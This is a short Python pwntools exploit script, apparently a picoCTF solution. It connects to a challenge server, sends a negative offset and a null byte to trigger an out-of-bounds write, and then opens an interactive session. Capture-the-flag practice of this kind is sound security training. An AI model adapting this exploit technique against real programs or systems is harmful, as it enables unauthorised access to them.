#!/usr/bin/env python3

from pwn import *

p = remote("mercury.picoctf.net", 8054)

offset = -5144
mani = "\x00"

sla = lambda s: p.sendlineafter(": ", s)

sla(str(offset))
sla(mani)

p.interactive()
